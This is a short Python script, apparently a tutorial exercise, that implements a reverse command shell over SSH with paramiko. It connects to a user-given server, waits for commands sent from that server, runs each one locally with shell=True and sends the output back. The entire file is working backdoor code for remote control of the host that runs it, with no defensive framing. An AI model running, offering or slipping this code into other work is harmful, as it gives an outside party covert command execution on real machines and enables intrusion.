import paramiko
import shlex
import subprocess

def ssh_command(ip, port, user, passwd, command):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, port=port, username=user, password=passwd)
    ssh_session = client.get_transport().open_session()

    if ssh_session.active:
        ssh_session.send(command)
        print(ssh_session.recv(1024).decode())

        while True:
            command = ssh_session.recv(1024)  # Get the command from the server
            try:
                cmd = command.decode()
                if cmd == 'exit':
                    client.close()
                    break
                # Execute the received command locally
                cmd_output = subprocess.check_output(shlex.split(cmd), shell=True)
                ssh_session.send(cmd_output or 'okay')
            except Exception as e:
                ssh_session.send(str(e))

        client.close()

if __name__ == '__main__':
    import getpass
    user = input('Enter your username: ') # tim
    password = getpass.getpass(('Enter your password: ')) # sekret
    ip = input('Enter server IP: ') # the ipaddress in the ssh_server.py
    port = int(input('Enter port: '))  # Convert input to integer
    ssh_command(ip, port, user, password, 'ClientConnected')
